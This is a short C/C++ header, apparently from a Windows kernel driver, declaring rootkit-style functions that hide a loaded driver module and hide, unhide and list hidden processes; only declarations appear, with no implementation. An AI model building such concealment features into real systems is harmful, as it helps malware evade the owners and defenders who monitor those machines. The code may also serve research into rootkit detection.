#pragma once
#include "helpers.h"
#pragma warning(disable : 4996)


namespace kernelobjs_hiding {
	NTSTATUS HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICODE_STRING DriverName);
	// NTSTATUS HideService(PUNICODE_STRING ServiceName);
}


namespace process {
	NTSTATUS HideProcess(USHORT ProcessId, char ProcessName[], BOOL IsStrict);
	NTSTATUS UnhideProcess(USHORT ProcessId, char ProcessName[], ULONG HiddenIndex);
	NTSTATUS ListHiddenProcesses(ULONG64* ListSize, PVOID* ListAddress);
}